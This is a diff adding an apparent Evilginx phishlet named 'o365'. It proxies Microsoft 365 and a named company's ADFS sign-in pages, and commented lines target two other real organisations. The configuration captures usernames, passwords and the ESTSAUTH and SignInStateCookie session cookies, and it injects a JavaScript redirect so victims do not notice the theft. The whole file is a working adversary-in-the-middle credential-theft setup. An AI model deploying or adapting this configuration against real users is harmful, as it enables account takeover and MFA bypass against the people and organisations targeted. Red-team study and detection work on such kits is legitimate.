@@ -1,0 +1,65 @@
+name: "o365"
+author: "@crosstress"
+min_ver: "2.4.0"
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: false, is_landing: false }
+  # The lines below are needed if your target organization utilizes ADFS.
+  # If they do, you need to uncomment all following lines that contain <...>
+  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
+  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
+  #    <insert-adfs-subdomain> = adfs
+  #    <insert-adfs-host> = example.com
+  #    <insert-adfs-subdomain-and-host> = adfs.example.com
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+  - { phish_sub: "adfs1", orig_sub: "sso", domain: "tesla.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "adfs1", orig_sub: "sso", domain: "tesla.com:443", session: true, is_landing: false, auto_filter: true }
+  # - { phish_sub: "adfs2", orig_sub: "sso", domain: "custard.com", session: true, is_landing: false, auto_filter: true }
+  # - { phish_sub: "adfs2", orig_sub: "sso", domain: "custard.com:443", session: true, is_landing: false, auto_filter: true }
+  # - { phish_sub: "adfs3", orig_sub: "adfs", domain: "woodhead-group.co.uk", session: true, is_landing: false, auto_filter: true }
+  # - { phish_sub: "adfs3", orig_sub: "adfs", domain: "woodhead-group.co.uk:443", session: true, is_landing: false, auto_filter: true }
+sub_filters:
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
+  # Uncomment and fill in if your target organization utilizes ADFS
+  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sso.tesla.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'sso.tesla.com/adfs/services/trust', replace: 'sso.tesla&#46;com/adfs/services/trust', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # - {triggers_on: 'sso.custard.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'sso.custard.com/adfs/services/trust', replace: 'sso.custard&#46;com/adfs/services/trust', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # - {triggers_on: 'adfs.woodhead-group.co.uk', orig_sub: 'login', domain: 'microsoftonline.com', search: 'adfs.woodhead-group.co.uk/adfs/services/trust', replace: 'adfs.woodhead-group&#46;co.uk/adfs/services/trust', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
+  - domain: "login.microsoftonline.com"
+    keys: ["SignInStateCookie"]
+auth_urls:
+  - "/kmsi*"
+credentials:
+  username:
+    key: "(login|UserName)"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "(passwd|Password)"
+    search: "(.*)"
+    type: "post"
+  custom:
+    - key: "email" # This is ignored
+      search: '"username":"([^"]*)'
+      type: "json"
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+js_inject:
+  - trigger_domains: ["www.domain.com"]
+    trigger_paths: ["/"]
+    script: |
+      function gimmesleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+      async function redir() {
+        await gimmesleep(2000);
+        window.location.href = "{rurl}";
+      }
+      redir()
